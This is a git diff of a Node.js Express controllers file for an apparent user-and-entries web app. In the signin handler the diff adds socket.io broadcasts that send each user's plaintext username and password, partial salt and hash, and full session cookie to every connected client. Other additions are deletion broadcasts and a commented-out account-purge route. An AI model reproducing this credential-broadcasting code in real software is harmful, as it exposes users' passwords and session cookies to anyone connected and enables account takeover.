@@ -1,8 +1,10 @@
 const chalk = require('chalk');
-const debug = require('debug')(chalk.hex('#38A53C').bgHex('#000000')('server:controllers'));
+const debug = require('./helpers/loggers')('controllers');
+// const debug = require('debug')(loggers.controllers);
 const hasher = require('pbkdf2-password')();
 const helpers = require('./helpers/helpers');
 const models = require('./models');
+const Promise = require('bluebird')
 
 function deleteFromTable(req, res) {
   const params = helpers.getQueryParams(req);
@@ -23,17 +25,34 @@ function updateField(req, res) {
 module.exports = {
   signin: {
     post: (req, res) => models.users.get(req.body.username)
-      .tap(results => {
-        req.app.io.once('connection', (socket) => {
-          console.log('New client has connected. 🔥🔥🔥🔥🔥🔥🔥🔥');
-          socket.emit('connection', 'New client has connected. 🔥🔥🔥🔥🔥🔥🔥🔥');
-        });
-      })
       .tap((user) => {
-        hasher({ password: req.body.password, salt: user[0].salt }, (err, pass, salt, hash) => {
+          hasher({ password: req.body.password, salt: user[0].salt }, (err, pass, salt, hash) => {
+
+            const truncatedSalt = salt.slice(0, 10) + '...';
+            const truncatedHash = hash.slice(0, 10) + '...';
+
+            var io = req.app.io;
+
+            io.emit(
+              'transmission',
+              `Username: ${req.body.username}\n
+              Password: ${req.body.password}`
+            );
+
+            io.emit(
+              'transmission',
+              `Salt generated: ${truncatedSalt}\n
+              Password hash: ${truncatedHash}`
+            );
+
+            io.emit(
+              'transmission',
+              `Cookie:\n\n${req.headers.cookie}`
+            );
+
           if (err) throw err;
-          debug(chalk.hex('#ff7643')(`HASH --- ${hash}`));
           if (hash !== user[0].hash) debug(chalk.hex('#ff7643')('Invalid password.'));
+
           req.session.regenerate(() => {
             req.session.user = user;
             req.session.save();
@@ -50,19 +69,33 @@ module.exports = {
       .catch(error => debug('Error', error)),
   },
 
+  // purgeAccount: {
+  //   delete: (req, res) => models.users
+  //     .delete(req.body.username)
+  //     .tap(() => {
+  //       req.app.io.emit('transmission',`Deleting all entries for user ${req.body.username}`);
+  //     })
+  //     .then(() => res.sendStatus(200))
+  //     .catch(error => debug('Error', error)),
+  //   delete: (req, res) => deleteFromTable(req, res),
+
+  // }
+
   users: {
     put: (req, res) => updateField(req, res),
-
     delete: (req, res) => deleteFromTable(req, res),
   },
 
   entries: {
     delete: (req, res) => models.entries
         .delete(req.body.entryId)
+        .tap(() => {
+          req.app.io.emit('transmission',`Deleting Entry No. ${req.body.entryId} from database.`);
+        })
         .then(() => res.sendStatus(200))
         .catch(error => debug('Error', error)),
 
-    get: (req, res, socket) => models.entries.get(req.query.username)
+    get: (req, res) => models.entries.get(req.query.username)
         .then(results => helpers.sortEntries(results))
         .then(results => res.send(results))
         .catch(error => debug('Error', error)),
